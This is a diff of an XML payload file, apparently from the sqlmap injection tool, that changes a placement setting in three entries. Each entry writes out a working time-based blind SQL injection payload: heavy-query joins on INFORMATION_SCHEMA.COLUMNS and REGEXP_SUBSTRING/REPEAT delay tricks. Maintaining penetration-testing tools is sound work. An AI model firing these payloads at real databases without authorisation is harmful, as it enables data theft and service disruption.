@@ -1645,7 +1645,7 @@
         <level>5</level>
         <risk>2</risk>
         <clause>1,2,3,9</clause>
-        <where>1</where>
+        <where>3</where>
         <vector>IF(([INFERENCE]),(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1),[RANDNUM])</vector>
         <request>
             <payload>(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C WHERE 0 XOR 1)</payload>
@@ -1918,7 +1918,7 @@
         <level>4</level>
         <risk>2</risk>
         <clause>1,2,3,9</clause>
-        <where>1</where>
+        <where>3</where>
         <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</vector>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</payload>
@@ -1938,7 +1938,7 @@
         <level>5</level>
         <risk>2</risk>
         <clause>1,2,3,9</clause>
-        <where>1</where>
+        <where>3</where>
         <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</vector>
         <request>
             <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</payload>
